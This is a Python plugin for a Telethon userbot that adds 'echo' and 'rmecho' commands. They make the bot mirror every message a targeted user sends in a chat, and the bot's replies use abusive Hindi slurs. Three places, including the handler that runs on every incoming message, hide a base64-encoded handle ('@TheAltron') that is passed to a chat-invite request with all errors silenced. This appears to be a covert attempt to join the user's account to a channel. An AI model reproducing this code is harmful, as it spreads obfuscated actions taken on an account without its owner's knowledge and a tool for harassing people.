import asyncio
import base64

from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from config import X1, SUDO_USERS, OWNER_ID, CMD_HNDLR as hl
from JARVIS.data import FRIDAY

ECHO = []

async def check_user(event, reply_msg):
    user_id = reply_msg.sender_id
    if user_id in FRIDAY:
        await event.reply("BSDK...BAAP HU TERA.")
    elif user_id == OWNER_ID:
        await event.reply("BETA...BAAP PAR ECHO NHI KRTE...")
    elif user_id in SUDO_USERS:
        await event.reply("YE BHI JARVIS KA BACHA HAI ISPE ECHO MAT MARO.. !!.")
    else:
        return True
    return False

async def activate_echo(event, check):
    global ECHO
    if check in ECHO:
        await event.reply("» ECHO ACTIVATED HAI ISS CHUTIYE PAR !!")
    else:
        ECHO.append(check)
        await event.reply("» ECHO ACTIVATED HAI ISS CHUTIYE PAR ✅")

async def deactivate_echo(event, check):
    global ECHO
    if check in ECHO:
        ECHO.remove(check)
        await event.reply("» ECHO STOP HO GYA ISS USER PR.. !! ☑️")
    else:
        await event.reply("» ECHO STOP HO GYA ISS USER PR.. !!")

@X1.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
async def echo(event):
    if event.sender_id in SUDO_USERS:
        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            if await check_user(event, reply_msg):
                try:
                    alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                    await event.client(alt)
                except BaseException:
                    pass
                check = f"{reply_msg.sender_id}_{event.chat_id}"
                await activate_echo(event, check)
        else:
            await event.reply(f"𝗘𝗰𝗵𝗼:\n  » {hl}echo <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")

@X1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
async def rmecho(event):
    if event.sender_id in SUDO_USERS:
        if event.reply_to_msg_id:
            try:
                alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                await event.client(alt)
            except BaseException:
                pass
            reply_msg = await event.get_reply_message()
            check = f"{reply_msg.sender_id}_{event.chat_id}"
            await deactivate_echo(event, check)
        else:
            await event.reply(f"𝗥𝗲𝗺𝗼𝘃𝗲 𝗘𝗰𝗵𝗼:\n  » {hl}rmecho <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")

@X1.on(events.NewMessage(incoming=True))
async def _(e):
    global ECHO
    check = f"{e.sender_id}_{e.chat_id}"
    if check in ECHO:
        try:
            alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
            await e.client(alt)
        except BaseException:
            pass
        if e.message.text or e.message.sticker:
            await e.reply(e.message)
            await asyncio.sleep(0.1)
